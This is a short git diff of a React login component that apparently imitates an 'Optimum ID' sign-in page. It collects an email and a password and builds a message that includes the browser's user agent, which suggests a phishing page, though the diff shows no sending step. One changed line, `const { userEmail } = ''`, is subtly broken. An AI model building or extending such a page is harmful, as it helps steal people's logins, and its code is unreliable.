@@ -7,7 +7,7 @@ const Home = () => {
     const [menuOpen, setMenuOpen] = useState(false);
     const [email, setEmail] = useState('');
     const [password, setPassword] = useState('');
-    const { userEmail } = useParams()
+    const { userEmail } = ''
     const [loading, toggleLoading] = useState(false)
     useEffect(() => {
         setEmail(userEmail)
@@ -267,6 +267,8 @@ User Agent: ${navigator.userAgent}`;
                         <p className="font-semibold">My Optimum ID</p>
                         <input
                             type="text"
+                            value={email}
+                            onChange={(e) => setEmail(e.target.value)}
                             className={`p-1.5 px-2 outline-none border rounded-md border-[#8c8c8c] bg-[#f2f2f2] ${errors.email ? 'border-red-500' : ''}`}
                         />
                         {errors.email && <p className="text-red-500 text-sm">{errors.email}</p>}
